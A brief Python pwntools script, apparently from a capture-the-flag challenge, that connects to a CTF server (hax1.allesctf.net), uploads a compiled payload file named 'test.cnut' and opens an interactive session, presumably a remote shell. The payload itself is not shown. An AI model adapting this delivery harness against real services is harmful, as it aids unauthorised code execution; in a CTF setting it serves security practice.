#!/usr/bin/env python3
from pwn import *

# target = remote('172.17.0.3', 1024)
target = remote('hax1.allesctf.net', 9888)

with open('test.cnut', 'rb') as f:
	code = f.read()

target.recvline_contains(b'length:')
target.sendline(f'{len(code)}')
target.recvline_contains(b'Code:')
target.sendline(code)

target.interactive()
